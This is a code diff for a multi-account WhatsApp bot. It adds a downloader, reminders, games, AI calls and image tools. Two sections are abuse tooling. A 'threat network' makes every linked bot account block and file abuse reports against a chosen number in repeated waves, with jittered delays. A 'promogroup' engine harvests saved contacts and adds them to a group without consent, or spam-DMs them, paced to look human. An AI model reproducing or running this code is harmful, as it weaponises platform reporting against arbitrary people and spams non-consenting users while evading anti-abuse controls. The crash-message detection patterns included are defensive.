+    reddit:     ["cobalt"],
+    tumblr:     ["cobalt"],
+    vimeo:      ["cobalt"],
+    twitch:     ["cobalt"],
+    generic:    ["cobalt"],
+};
+async function downloadMedia(url, opts = {}) {
+    const platform = detectPlatform(url);
+    if (!platform) { const e = new Error("Could not detect platform from URL"); e.platform = "unknown"; throw e; }
+    const chain = DL_CHAIN[platform] || DL_CHAIN.generic;
+    const skip = new Set(opts.skipProviders || []);
+    const errs = [];
+    for (const name of chain) {
+        if (skip.has(name)) continue;
+        const fn = DL_PROVIDERS[name];
+        if (!fn) continue;
+        try {
+            const res = await fn(url, opts);
+            if (res?.url) { markDlHealth(name, true); return { ...res, provider: name, platform }; }
+            throw new Error("provider returned no url");
+        } catch (e) {
+            const m = e?.message || String(e);
+            errs.push(`${name}: ${m}`);
+            markDlHealth(name, false, m);
+        }
+    }
+    const err = new Error(`All providers failed for ${platform}\n${errs.join("\n")}`);
+    err.platform = platform; err.providerErrors = errs;
+    throw err;
+}
+async function notifyOwnerDlFailure(sock, platform, url, errs) {
+    try {
+        const now = Date.now();
+        if (DL_NOTIFY_COOLDOWN[platform] && now - DL_NOTIFY_COOLDOWN[platform] < 30 * 60 * 1000) return;
+        DL_NOTIFY_COOLDOWN[platform] = now;
+        const selfNum = (sock.user?.id || "").split(":")[0].split("@")[0];
+        if (!selfNum) return;
+        const selfJid = selfNum + "@s.whatsapp.net";
+        const txt = `⚠️ *Downloader Alert*\n━━━━━━━━━━━━━━━━━━━\n\nAll providers failed for *${platform}*.\n\n🔗 ${url}\n\n*Errors:*\n${errs.map(e => `• ${e}`).join("\n")}\n\n_Run .dlhealth for full provider stats._`;
+        await sock.sendMessage(selfJid, { text: txt });
+    } catch {}
+}
+
+// --- THREAT NETWORK (cross-bot intel + mass-report) ---
+const THREATS_FILE = dataPath("global_threats.json");
+const REPORT_CATEGORIES = ["scam", "harassment", "spam", "illegal", "impersonation", "hate", "other"];
+function loadThreats() { try { return JSON.parse(fs.readFileSync(THREATS_FILE, "utf8")); } catch { return {}; } }
+function saveThreats(d) { try { fs.writeFileSync(THREATS_FILE, JSON.stringify(d, null, 2)); } catch {} }
+function normalizeNum(input) { return String(input || "").replace(/[^\d]/g, ""); }
+function jidFromNum(num) { return `${normalizeNum(num)}@s.whatsapp.net`; }
+function isThreatJid(jid) {
+    if (!jid) return false;
+    const num = normalizeNum(jid.split("@")[0].split(":")[0]);
+    const t = loadThreats()[num];
+    return !!(t && t.autoBlocked !== false);
+}
+function getThreat(num) { return loadThreats()[normalizeNum(num)] || null; }
+function addThreat(num, reporterBotJid, category, note) {
+    const cleanNum = normalizeNum(num);
+    if (!cleanNum) return null;
+    const cat = REPORT_CATEGORIES.includes((category || "").toLowerCase()) ? category.toLowerCase() : "scam";
+    const d = loadThreats();
+    if (!d[cleanNum]) {
+        d[cleanNum] = {
+            severity: "high", reports: [], autoBlocked: true,
+            firstReported: Date.now(), lastSeen: Date.now(),
+            triggerCount: 0, botActions: {}, nextReportAt: Date.now(),
+            primaryCategory: cat,
+        };
+    }
+    d[cleanNum].reports.push({ reporter: reporterBotJid || "unknown", category: cat, note: note || "", at: Date.now() });
+    d[cleanNum].lastSeen = Date.now();
+    d[cleanNum].primaryCategory = cat;
+    saveThreats(d);
+    return d[cleanNum];
+}
+function removeThreat(num) {
+    const d = loadThreats();
+    const k = normalizeNum(num);
+    if (d[k]) { delete d[k]; saveThreats(d); return true; }
+    return false;
+}
+function recordThreatBotAction(num, botJid, action) {
+    const d = loadThreats();
+    const k = normalizeNum(num);
+    if (!d[k]) return;
+    if (!d[k].botActions) d[k].botActions = {};
+    if (!d[k].botActions[botJid]) d[k].botActions[botJid] = { blocked: false, reportedAt: 0, reportCount: 0 };
+    if (action === "blocked") d[k].botActions[botJid].blocked = true;
+    if (action === "reported") { d[k].botActions[botJid].reportedAt = Date.now(); d[k].botActions[botJid].reportCount = (d[k].botActions[botJid].reportCount || 0) + 1; }
+    if (action === "trigger") d[k].triggerCount = (d[k].triggerCount || 0) + 1;
+    saveThreats(d);
+}
+async function blockUserOnSock(sock, jid) {
+    try {
+        if (typeof sock.updateBlockStatus === "function") {
+            await sock.updateBlockStatus(jid, "block");
+            return true;
+        }
+    } catch (e) { console.log(`[ThreatNet] block failed on ${jid}: ${e?.message}`); }
+    return false;
+}
+async function submitWAReport(sock, jid, category) {
+    try {
+        const cat = REPORT_CATEGORIES.includes(category) ? category : "scam";
+        if (typeof sock.sendReceipt === "function") {
+            try { await sock.sendReceipt(jid, undefined, [], "report"); } catch {}
+        }
+        if (typeof sock.query === "function") {
+            try {
+                await sock.query({
+                    tag: "iq",
+                    attrs: { to: "s.whatsapp.net", type: "set", xmlns: "urn:xmpp:reporting:0" },
+                    content: [{ tag: "report", attrs: { reason: cat }, content: [{ tag: "jid", attrs: {}, content: jid }] }],
+                });
+            } catch {}
+        }
+        return true;
+    } catch (e) { console.log(`[ThreatNet] report failed on ${jid}: ${e?.message}`); return false; }
+}
+async function runReportWaveAcrossAllBots(num, category, opts = {}) {
+    const cleanNum = normalizeNum(num);
+    if (!cleanNum) return { ok: 0, fail: 0 };
+    const targetJid = jidFromNum(cleanNum);
+    const bots = Object.entries(activeSockets).filter(([_, s]) => s && s.user);
+    let ok = 0, fail = 0;
+    const stagger = opts.immediate ? 0 : (opts.staggerSec || 8) * 1000;
+    for (let i = 0; i < bots.length; i++) {
+        const [, sock] = bots[i];
+        try {
+            const blocked = await blockUserOnSock(sock, targetJid);
+            const reported = await submitWAReport(sock, targetJid, category);
+            recordThreatBotAction(cleanNum, sock.user.id, "blocked");
+            recordThreatBotAction(cleanNum, sock.user.id, "reported");
+            if (blocked || reported) ok++; else fail++;
+        } catch { fail++; }
+        if (i < bots.length - 1 && stagger > 0) {
+            const jitter = Math.floor(Math.random() * stagger * 0.6);
+            await new Promise(r => setTimeout(r, stagger + jitter));
+        }
+    }
+    const d = loadThreats();
+    if (d[cleanNum]) {
+        d[cleanNum].nextReportAt = Date.now() + 6 * 3600 * 1000;
+        saveThreats(d);
+    }
+    return { ok, fail, totalBots: bots.length };
+}
+function scheduleThreatReportCycle() {
+    setInterval(() => {
+        try {
+            const d = loadThreats();
+            const now = Date.now();
+            for (const [num, t] of Object.entries(d)) {
+                if (!t.autoBlocked) continue;
+                if (t.nextReportAt && now >= t.nextReportAt) {
+                    const ageDays = (now - (t.firstReported || now)) / (24 * 3600 * 1000);
+                    if (ageDays > 7) continue;
+                    runReportWaveAcrossAllBots(num, t.primaryCategory || "scam", { staggerSec: 12 }).catch(() => {});
+                }
+            }
+        } catch {}
+    }, 30 * 60 * 1000);
+}
+
+// --- STRONGER ANTIBUG ---
+function detectBugPatterns(text) {
+    if (!text) return null;
+    const reasons = [];
+    const zw = (text.match(/[\u200b-\u200f\u202a-\u202e\u2060-\u206f\ufeff\u00ad]/g) || []).length;
+    const comb = (text.match(/[\u0300-\u036f\u0489\u0c00-\u0c7f\u0c80-\u0cff\u0b80-\u0bff\u0600-\u06ff\ufdfb-\ufdfd]/g) || []).length;
+    const newlines = (text.match(/\n/g) || []).length;
+    const mentions = (text.match(/@\d{6,}/g) || []).length;
+    const emojis = (text.match(/\p{Extended_Pictographic}/gu) || []).length;
+    const ratio = zw / Math.max(text.length, 1);
+    let maxRun = 0, run = 1;
+    for (let i = 1; i < text.length; i++) { if (text[i] === text[i-1]) { run++; if (run > maxRun) maxRun = run; } else run = 1; }
+    if (text.length > 5000) reasons.push(`oversize:${text.length}`);
+    if (zw > 300) reasons.push(`zero-width:${zw}`);
+    if (comb > 800) reasons.push(`combining:${comb}`);
+    if (ratio > 0.35) reasons.push(`invisible-ratio:${ratio.toFixed(2)}`);
+    if (newlines > 200) reasons.push(`newline-flood:${newlines}`);
+    if (mentions > 30) reasons.push(`mention-bomb:${mentions}`);
+    if (emojis > 400) reasons.push(`emoji-flood:${emojis}`);
+    if (maxRun > 800) reasons.push(`char-repeat:${maxRun}`);
+    return reasons.length ? reasons : null;
+}
+const antibugOffenders = {};
+function recordAntibugHit(senderJid) {
+    const k = senderJid;
+    const now = Date.now();
+    if (!antibugOffenders[k]) antibugOffenders[k] = { hits: [], firstHit: now };
+    antibugOffenders[k].hits = antibugOffenders[k].hits.filter(t => now - t < 30 * 60 * 1000);
+    antibugOffenders[k].hits.push(now);
+    return antibugOffenders[k].hits.length;
+}
+
+// --- PROMOGROUP (growth engine with per-bot stagger) ---
+const PROMOGROUP_FILE = dataPath("promogroup.json");
+const PROMOGROUP_DEFAULTS = {
+    enabled: false, groupJid: "", groupLink: "",
+    rate: 2, intervalHours: 24, poolAuto: true,
+    manualPool: [], optedOut: [],
+    added: {}, skipped: {}, lastRun: {},
+    stats: { totalAdded: 0, totalInvited: 0, totalFailed: 0 },
+    paused: false,
+};
+function loadPromoGroup() {
+    if (!fs.existsSync(PROMOGROUP_FILE)) return { ...PROMOGROUP_DEFAULTS };
+    try { return { ...PROMOGROUP_DEFAULTS, ...JSON.parse(fs.readFileSync(PROMOGROUP_FILE, "utf8")) }; }
+    catch { return { ...PROMOGROUP_DEFAULTS }; }
+}
+function savePromoGroup(d) { try { fs.writeFileSync(PROMOGROUP_FILE, JSON.stringify(d, null, 2)); } catch {} }
+function botStaggerOffsetMs(botJid, intervalHours) {
+    let h = 0; const s = String(botJid || "x");
+    for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) >>> 0;
+    return (h % (intervalHours * 3600 * 1000));
+}
+function isBusinessHourLagos() {
+    const h = Number(new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos", hour: "2-digit", hour12: false }));
+    return h >= 9 && h < 21;
+}
+function getPromoGroupContactPool(sock, cfg) {
+    const set = new Set();
+    if (cfg.poolAuto && sock?.store?.contacts) {
+        for (const jid of Object.keys(sock.store.contacts)) {
+            if (jid.endsWith("@s.whatsapp.net")) set.add(normalizeNum(jid.split("@")[0]));
+        }
+    }
+    for (const n of (cfg.manualPool || [])) set.add(normalizeNum(n));
+    for (const n of (cfg.optedOut || [])) set.delete(normalizeNum(n));
+    const selfNum = normalizeNum((sock.user?.id || "").split(":")[0]);
+    if (selfNum) set.delete(selfNum);
+    return [...set].filter(Boolean);
+}
+async function runPromoGroupCycleForBot(sock) {
+    const cfg = loadPromoGroup();
+    if (!cfg.enabled || cfg.paused || !cfg.groupJid) return;
+    if (!isBusinessHourLagos()) return;
+    const botJid = sock.user?.id || "unknown";
+    const pool = getPromoGroupContactPool(sock, cfg);
+    const alreadyDone = new Set(Object.keys((cfg.added[botJid] || {})).concat(Object.keys((cfg.skipped[botJid] || {})).filter(k => (cfg.skipped[botJid][k]?.reason === "permanent"))));
+    const eligible = pool.filter(n => !alreadyDone.has(n));
+    if (!eligible.length) return;
+    const picks = eligible.sort(() => Math.random() - 0.5).slice(0, cfg.rate || 2);
+    for (const num of picks) {
+        const jid = jidFromNum(num);
+        let method = "failed", reason = "";
+        try {
+            const res = await sock.groupParticipantsUpdate(cfg.groupJid, [jid], "add");
+            const code = Array.isArray(res) ? res[0]?.status : res?.[jid]?.status;
+            if (code === "200" || code === 200 || code === undefined) {
+                method = "added"; cfg.stats.totalAdded++;
+            } else if (String(code) === "403" || String(code) === "408" || String(code) === "409") {
+                try {
+                    await sock.sendMessage(jid, { text: `👋 Hey there!\n\nYou've got my number (Phantom-X) saved on WhatsApp, so I figured you might want in on the official community group for updates, new commands, and tips:\n\n🔗 ${cfg.groupLink || "<link>"}\n\nReply *STOP* if you'd rather I never message you again. 🙏` });
+                    method = "invited"; cfg.stats.totalInvited++;
+                } catch (e) { method = "failed"; reason = `dm-fail: ${e?.message}`; cfg.stats.totalFailed++; }
+            } else { method = "failed"; reason = `code:${code}`; cfg.stats.totalFailed++; }
+        } catch (e) { method = "failed"; reason = e?.message || "unknown"; cfg.stats.totalFailed++; }
+        if (!cfg.added[botJid]) cfg.added[botJid] = {};
+        if (!cfg.skipped[botJid]) cfg.skipped[botJid] = {};
+        if (method === "added" || method === "invited") cfg.added[botJid][num] = { at: Date.now(), method };
+        else cfg.skipped[botJid][num] = { at: Date.now(), reason };
+        await new Promise(r => setTimeout(r, 5000 + Math.floor(Math.random() * 5000)));
+    }
+    cfg.lastRun[botJid] = Date.now();
+    savePromoGroup(cfg);
+}
+function schedulePromoGroup() {
+    setInterval(async () => {
+        const cfg = loadPromoGroup();
+        if (!cfg.enabled || cfg.paused) return;
+        const intervalMs = (cfg.intervalHours || 24) * 3600 * 1000;
+        const now = Date.now();
+        for (const [, sock] of Object.entries(activeSockets)) {
+            if (!sock?.user?.id) continue;
+            const botJid = sock.user.id;
+            const last = cfg.lastRun[botJid] || 0;
+            const offset = botStaggerOffsetMs(botJid, cfg.intervalHours || 24);
+            const nextDue = last === 0 ? (now - intervalMs + offset) : (last + intervalMs);
+            if (now >= nextDue) {
+                runPromoGroupCycleForBot(sock).catch(e => console.log(`[promo] cycle err: ${e?.message}`));
+            }
+        }
+    }, 15 * 60 * 1000);
+}
+
+// --- PRODUCTIVITY: REMINDERS / TODOS / NOTES / TIMERS / COUNTDOWNS / CALENDAR ---
+const REMINDERS_FILE = dataPath("reminders.json");
+const TODOS_FILE = dataPath("todos.json");
+const NOTES_FILE = dataPath("notes.json");
+const TIMERS_FILE = dataPath("timers.json");
+const COUNTDOWNS_FILE = dataPath("countdowns.json");
+function _loadJson(f, def) { if (!fs.existsSync(f)) return def; try { return JSON.parse(fs.readFileSync(f, "utf8")); } catch { return def; } }
+function _saveJson(f, d) { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch {} }
+function loadReminders() { return _loadJson(REMINDERS_FILE, []); }
+function saveReminders(d) { _saveJson(REMINDERS_FILE, d); }
+function loadTodos() { return _loadJson(TODOS_FILE, {}); }
+function saveTodos(d) { _saveJson(TODOS_FILE, d); }
+function loadNotes() { return _loadJson(NOTES_FILE, {}); }
+function saveNotes(d) { _saveJson(NOTES_FILE, d); }
+function loadTimers() { return _loadJson(TIMERS_FILE, []); }
+function saveTimers(d) { _saveJson(TIMERS_FILE, d); }
+function loadCountdowns() { return _loadJson(COUNTDOWNS_FILE, {}); }
+function saveCountdowns(d) { _saveJson(COUNTDOWNS_FILE, d); }
+function shortId() { return Math.random().toString(36).slice(2, 8); }
+function parseDuration(s) {
+    if (!s) return 0;
+    const str = String(s).toLowerCase().trim();
+    let total = 0; let matched = false;
+    const re = /(\d+(?:\.\d+)?)\s*(d|day|days|h|hr|hrs|hour|hours|m|min|mins|minute|minutes|s|sec|secs|second|seconds|w|wk|wks|week|weeks)/g;
+    let m;
+    while ((m = re.exec(str)) !== null) {
+        matched = true;
+        const n = parseFloat(m[1]); const u = m[2];
+        if (/^w/.test(u)) total += n * 7 * 24 * 3600 * 1000;
+        else if (/^d/.test(u)) total += n * 24 * 3600 * 1000;
+        else if (/^h/.test(u)) total += n * 3600 * 1000;
+        else if (/^m/.test(u)) total += n * 60 * 1000;
+        else if (/^s/.test(u)) total += n * 1000;
+    }
+    if (!matched) {
+        const justNum = parseFloat(str);
+        if (!isNaN(justNum)) total = justNum * 60 * 1000;
+    }
+    return total;
+}
+function fmtDuration(ms) {
+    if (ms < 0) ms = 0;
+    const d = Math.floor(ms / 86400000); ms -= d * 86400000;
+    const h = Math.floor(ms / 3600000); ms -= h * 3600000;
+    const m = Math.floor(ms / 60000); ms -= m * 60000;
+    const s = Math.floor(ms / 1000);
+    const out = [];
+    if (d) out.push(`${d}d`); if (h) out.push(`${h}h`); if (m) out.push(`${m}m`);
+    if (!d && !h && s) out.push(`${s}s`); else if (!d && !h && !m) out.push("0s");
+    return out.join(" ") || "0s";
+}
+function armReminder(entry, getSock) {
+    const wait = Math.max(0, entry.fireAt - Date.now());
+    setTimeout(async () => {
+        try {
+            const arr = loadReminders();
+            const still = arr.find(r => r.id === entry.id);
+            if (!still) return;
+            const s = getSock();
+            if (s) {
+                const mention = entry.userJid ? `@${entry.userJid.split("@")[0]}` : "";
+                await s.sendMessage(entry.chatJid, { text: `⏰ *Reminder${mention ? ` for ${mention}` : ""}*\n\n${entry.text}`, mentions: entry.userJid ? [entry.userJid] : [] });
+            }
+            saveReminders(loadReminders().filter(r => r.id !== entry.id));
+        } catch (e) { console.log(`[reminder] err: ${e?.message}`); }
+    }, wait).unref?.();
+}
+function rearmAllReminders() {
+    for (const e of loadReminders()) armReminder(e, () => {
+        for (const [, s] of Object.entries(activeSockets)) if (s?.user?.id === e.botJid) return s;
+        return Object.values(activeSockets)[0] || null;
+    });
+}
+function armTimer(entry, getSock) {
+    const wait = Math.max(0, entry.fireAt - Date.now());
+    setTimeout(async () => {
+        try {
+            const arr = loadTimers();
+            const still = arr.find(r => r.id === entry.id);
+            if (!still) return;
+            const s = getSock();
+            if (s) {
+                await s.sendMessage(entry.chatJid, { text: `⏱️ *Timer done!*${entry.label ? `\n\n${entry.label}` : ""}` });
+            }
+            saveTimers(loadTimers().filter(r => r.id !== entry.id));
+        } catch {}
+    }, wait).unref?.();
+}
+function rearmAllTimers() {
+    for (const e of loadTimers()) armTimer(e, () => {
+        for (const [, s] of Object.entries(activeSockets)) if (s?.user?.id === e.botJid) return s;
+        return Object.values(activeSockets)[0] || null;
+    });
+}
+function buildCalendar(year, month, marks = {}) {
+    const first = new Date(year, month, 1);
+    const startDow = first.getDay();
+    const days = new Date(year, month + 1, 0).getDate();
+    const monthName = first.toLocaleString("en-US", { month: "long" });
+    const today = new Date();
+    const isCurMonth = today.getFullYear() === year && today.getMonth() === month;
+    let out = `🗓️ *${monthName} ${year}*\n━━━━━━━━━━━━━━━━━━━━\n`;
+    out += `Su Mo Tu We Th Fr Sa\n`;
+    let line = "";
+    for (let i = 0; i < startDow; i++) line += "   ";
+    for (let day = 1; day <= days; day++) {
+        const isToday = isCurMonth && today.getDate() === day;
+        const mk = marks[day];
+        const cell = isToday ? `[${String(day).padStart(2, "0")}]` : (mk ? `*${String(day).padStart(2, "0")}` : ` ${String(day).padStart(2, "0")}`);
+        line += cell.padEnd(3, " ");
+        if ((startDow + day) % 7 === 0) { out += line + "\n"; line = ""; }
+    }
+    if (line.trim()) out += line + "\n";
+    if (Object.keys(marks).length) {
+        out += `\n*Events:*\n`;
+        for (const [day, label] of Object.entries(marks)) out += `• ${monthName} ${day} — ${label}\n`;
+    }
+    return out;
+}
+
+// --- AI PERSONA ---
+const PERSONA_FILE = dataPath("persona.json");
+function loadPersonas() { return _loadJson(PERSONA_FILE, {}); }
+function savePersonas(d) { _saveJson(PERSONA_FILE, d); }
+function getPersona(scopeJid) { return loadPersonas()[scopeJid] || ""; }
+function setPersona(scopeJid, text) { const d = loadPersonas(); d[scopeJid] = text; savePersonas(d); }
+function clearPersona(scopeJid) { const d = loadPersonas(); delete d[scopeJid]; savePersonas(d); }
+async function callGemini(prompt, opts = {}) {
+    const KEY = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
+    if (!KEY) throw new Error("Gemini API key not set. Add GEMINI_API_KEY (or GOOGLE_API_KEY) from https://aistudio.google.com/app/apikey");
+    // Prefer newer Gemini first, then stable fallbacks
+    const models = opts.model
+        ? [opts.model]
+        : [process.env.GEMINI_MODEL || "gemini-2.0-flash", "gemini-1.5-flash", "gemini-1.5-flash-8b"];
+    const sys = opts.system ? [{ text: opts.system }] : [];
+    let lastErr = null;
+    for (const model of models) {
+        const body = JSON.stringify({
+            contents: [{ parts: sys.concat([{ text: prompt }]) }],
+            generationConfig: { temperature: opts.temperature ?? 0.7 },
+        });
+        try {
+            const result = await new Promise((resolve, reject) => {
+                const req = https.request({
+                    hostname: "generativelanguage.googleapis.com",
+                    path: `/v1beta/models/${model}:generateContent?key=${KEY}`,
+                    method: "POST",
+                    headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
+                }, (res) => {
+                    let data = ""; res.on("data", c => data += c);
+                    res.on("end", () => {
+                        try {
+                            const p = JSON.parse(data);
+                            const t = p?.candidates?.[0]?.content?.parts?.[0]?.text;
+                            if (t) resolve(t.trim());
+                            else {
+                                const errMsg = p?.error?.message || p?.error?.status || "Empty response from Gemini";
+                                reject(new Error(errMsg));
+                            }
+                        } catch (e) { reject(e); }
+                    });
+                });
+                req.on("error", reject); req.write(body); req.end();
+            });
+            return result;
+        } catch (e) {
+            lastErr = e;
+            const msg = e?.message || "";
+            const isUnavailable = msg.includes("not found") || msg.includes("NOT_FOUND") || msg.includes("404") || msg.includes("permission") || msg.includes("PERMISSION_DENIED");
+            const isRateLimited = msg.includes("RESOURCE_EXHAUSTED") || msg.includes("429") || msg.includes("quota") || msg.includes("rate") || msg.includes("too many");
+            if (!isUnavailable && !isRateLimited) {
+                throw e; // real error (network, parse, auth) — don't retry
+            }
+            // model unavailable OR quota/rate-limit — fall through to next model
+        }
+    }
+    throw lastErr || new Error("All Gemini models failed");
+}
+
+// Calls a Pollinations.ai model by name (free, no key needed)
+async function callPollinations(prompt, opts = {}, model = "openai") {
+    const messages = [];
+    if (opts.system) messages.push({ role: "system", content: opts.system });
+    messages.push({ role: "user", content: prompt });
+    const body = JSON.stringify({ messages, model, seed: Math.floor(Math.random() * 9999) });
+    return await new Promise((resolve, reject) => {
+        const req = https.request({
+            hostname: "text.pollinations.ai",
+            path: "/",
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
+        }, (res) => {
+            let data = "";
+            res.on("data", c => data += c);
+            res.on("end", () => {
+                const text = data.trim();
+                if (!text) return reject(new Error(`Empty response from Pollinations (${model})`));
+
+                let parsed = null;
+                try { parsed = JSON.parse(text); } catch (_) {}
+
+                const badStatus = res.statusCode && (res.statusCode < 200 || res.statusCode >= 300);
+                const apiError = parsed && (parsed.error || parsed.status === 404 || parsed.status === "error" || Number(parsed.status) >= 400);
+                if (badStatus || apiError) {
+                    const detail = parsed?.error || parsed?.message || text;
+                    return reject(new Error(`Pollinations ${model} failed${res.statusCode ? ` (${res.statusCode})` : ""}: ${detail}`));
+                }
+
+                const out =
+                    (typeof parsed === "string" && parsed) ||
+                    parsed?.choices?.[0]?.message?.content ||
+                    parsed?.choices?.[0]?.text ||
+                    parsed?.text ||
+                    (Array.isArray(parsed) && parsed[0]?.text) ||
+                    text;
+
+                if (out && String(out).trim()) return resolve(String(out).trim());
+                return reject(new Error(`Empty response from Pollinations (${model})`));
+            });
+        });
+        req.on("error", reject);
+        req.write(body);
+        req.end();
+    });
+}
+
+async function callAI(prompt, opts = {}) {
+    let lastErr = null;
+
+    try {
+        return await callGemini(prompt, opts);
+    } catch (e) {
+        lastErr = e;
+    }
+
+    try {
+        return await callPollinations(prompt, opts, "openai");
+    } catch (e) {
+        lastErr = e;
+    }
+
+    throw lastErr || new Error("All AI providers failed");
+}
+
+// --- TTS (Google Translate free endpoint, multi-language) ---
+async function googleTts(text, lang = "en") {
+    const safe = String(text || "").slice(0, 200);
+    const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(safe)}&tl=${encodeURIComponent(lang)}&client=tw-ob&ttsspeed=1`;
+    return await fetchBuffer(url);
+}
+
+// --- IMAGE EDITOR (sharp + external for removebg/upscale/cartoon) ---
+let _sharp = null;
+function getSharp() { if (!_sharp) try { _sharp = require("sharp"); } catch (e) { throw new Error("sharp not installed"); } return _sharp; }
+async function applyImageOp(buf, op, args = {}) {
+    const sharp = getSharp();
+    const img = sharp(buf, { failOn: "none" });
+    switch (op) {
+        case "blur": return await img.blur(Number(args.amount) || 8).toBuffer();
+        case "invert": return await img.negate({ alpha: false }).toBuffer();
+        case "grayscale": return await img.grayscale().toBuffer();
+        case "brighten": return await img.modulate({ brightness: Number(args.amount) || 1.4 }).toBuffer();
+        case "darken": return await img.modulate({ brightness: Number(args.amount) || 0.6 }).toBuffer();
+        case "sharpen": return await img.sharpen({ sigma: Number(args.amount) || 2 }).toBuffer();
+        case "pixelate": {
+            const meta = await img.metadata();
+            const px = Math.max(4, Math.floor((meta.width || 400) / (Number(args.amount) || 30)));
+            return await sharp(buf, { failOn: "none" })
+                .resize(px, null, { kernel: "nearest" })
+                .resize(meta.width, meta.height, { kernel: "nearest" })
+                .toBuffer();
+        }
+        case "cartoon": {
+            return await img.median(3).modulate({ saturation: 1.6 }).sharpen({ sigma: 2 }).toBuffer();
+        }
+        default: throw new Error(`unknown op: ${op}`);
+    }
+}
+async function removeBgRemote(buf) {
+    const KEY = process.env.REMOVE_BG_API_KEY;
+    if (KEY) {
+        const fd = new FormData();
+        fd.append("image_file", new Blob([buf]), "image.png");
+        fd.append("size", "auto");
+        const res = await fetch("https://api.remove.bg/v1.0/removebg", { method: "POST", headers: { "X-Api-Key": KEY }, body: fd });
+        if (!res.ok) throw new Error(`remove.bg HTTP ${res.status}`);
+        return Buffer.from(await res.arrayBuffer());
+    }
+    throw new Error("REMOVE_BG_API_KEY not set. Add a free key from remove.bg (50 free/month) to enable .removebg.");
+}
+async function upscaleRemote(buf) {
+    throw new Error("Upscaling needs an external API key. Set DEEPAI_API_KEY (free tier at deepai.org) to enable .upscale.");
+}
+
+// --- GAMES: state for new games ---
+const akinatorState = {};
+const guessFlagState = {};
+const mathState = {};
+const newScrambleState = {};
+const typingTestState = {};
+const connect4State = {};
+const werewolfState = {};
+const FLAGS = [
+    { e: "🇳🇬", n: "Nigeria" }, { e: "🇬🇭", n: "Ghana" }, { e: "🇰🇪", n: "Kenya" }, { e: "🇿🇦", n: "South Africa" },
+    { e: "🇪🇬", n: "Egypt" }, { e: "🇲🇦", n: "Morocco" }, { e: "🇪🇹", n: "Ethiopia" }, { e: "🇸🇳", n: "Senegal" },
+    { e: "🇺🇸", n: "United States" }, { e: "🇬🇧", n: "United Kingdom" }, { e: "🇨🇦", n: "Canada" }, { e: "🇲🇽", n: "Mexico" },
+    { e: "🇧🇷", n: "Brazil" }, { e: "🇦🇷", n: "Argentina" }, { e: "🇨🇴", n: "Colombia" }, { e: "🇨🇱", n: "Chile" },
+    { e: "🇫🇷", n: "France" }, { e: "🇩🇪", n: "Germany" }, { e: "🇮🇹", n: "Italy" }, { e: "🇪🇸", n: "Spain" },
+    { e: "🇵🇹", n: "Portugal" }, { e: "🇳🇱", n: "Netherlands" }, { e: "🇧🇪", n: "Belgium" }, { e: "🇨🇭", n: "Switzerland" },
+    { e: "🇸🇪", n: "Sweden" }, { e: "🇳🇴", n: "Norway" }, { e: "🇩🇰", n: "Denmark" }, { e: "🇫🇮", n: "Finland" },
+    { e: "🇷🇺", n: "Russia" }, { e: "🇺🇦", n: "Ukraine" }, { e: "🇵🇱", n: "Poland" }, { e: "🇹🇷", n: "Turkey" },
+    { e: "🇨🇳", n: "China" }, { e: "🇯🇵", n: "Japan" }, { e: "🇰🇷", n: "South Korea" }, { e: "🇮🇳", n: "India" },
+    { e: "🇵🇰", n: "Pakistan" }, { e: "🇮🇩", n: "Indonesia" }, { e: "🇵🇭", n: "Philippines" }, { e: "🇹🇭", n: "Thailand" },
+    { e: "🇻🇳", n: "Vietnam" }, { e: "🇲🇾", n: "Malaysia" }, { e: "🇸🇬", n: "Singapore" }, { e: "🇦🇺", n: "Australia" },
+    { e: "🇳🇿", n: "New Zealand" }, { e: "🇸🇦", n: "Saudi Arabia" }, { e: "🇦🇪", n: "United Arab Emirates" }, { e: "🇮🇱", n: "Israel" },
+];
+const TYPING_SENTENCES = [
+    "The quick brown fox jumps over the lazy dog near the river bank.",
+    "Phantom X is the most powerful WhatsApp bot ever built in Nigeria.",
+    "Coding is fun when you ship features that real people actually use.",
+    "Never give up on your dreams because every legend was once a beginner.",
+    "Practice makes perfect but consistency makes a champion in any field.",
+];
+const WEREWOLF_ROLES = ["villager", "villager", "villager", "werewolf", "seer", "doctor"];
+
+// --- CONNECT4 helpers ---
+function newC4Board() { return Array.from({ length: 6 }, () => Array(7).fill(0)); }
+function renderC4(board) {
+    const map = { 0: "⚪", 1: "🔴", 2: "🟡" };
+    let out = "1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣\n";
+    for (const row of board) out += row.map(c => map[c]).join("") + "\n";
+    return out;
+}
+function c4Drop(board, col, p) {
+    for (let r = 5; r >= 0; r--) { if (board[r][col] === 0) { board[r][col] = p; return r; } }
+    return -1;
+}
+function c4Wins(board, p) {
+    const lines = [[0,1],[1,0],[1,1],[1,-1]];
+    for (let r = 0; r < 6; r++) for (let c = 0; c < 7; c++) for (const [dr, dc] of lines) {
+        let cnt = 0;
+        for (let i = 0; i < 4; i++) { const nr = r + dr*i, nc = c + dc*i; if (nr<0||nr>=6||nc<0||nc>=7) break; if (board[nr][nc]!==p) break; cnt++; }
+        if (cnt === 4) return true;
+    }
+    return false;
+}
+
+// --- PREMIUM / UNLOCK SYSTEM ---
+const PREMIUM_FILE = dataPath("premium.json");
+function loadPremium() { if (!fs.existsSync(PREMIUM_FILE)) return {}; try { return JSON.parse(fs.readFileSync(PREMIUM_FILE, "utf8")); } catch { return {}; } }
+function savePremium(d) { fs.writeFileSync(PREMIUM_FILE, JSON.stringify(d, null, 2)); }
+function hasPremiumAccess(senderJid, cmd) {
+    const data = loadPremium();
+    const num = (senderJid || "").replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0];
+    const cmdKey = (cmd || "").toLowerCase();
+    // locked_for check comes FIRST — overrides any premium grant
+    const lockedFor = data.locked_for || {};
+    const isLockedForNum = (entry) => entry === "all" || (Array.isArray(entry) && (entry.includes("all") || entry.includes(num)));
+    if (isLockedForNum(lockedFor["allcmds"])) return false;
+    if (isLockedForNum(lockedFor[cmdKey])) return false;
+    // Grant checks
+    if (data.global_unlock) return true;
+    const premNums = data.premium_numbers || [];
+    if (premNums.includes(num)) return true;
+    const unlocked = data.unlocked_cmds || {};
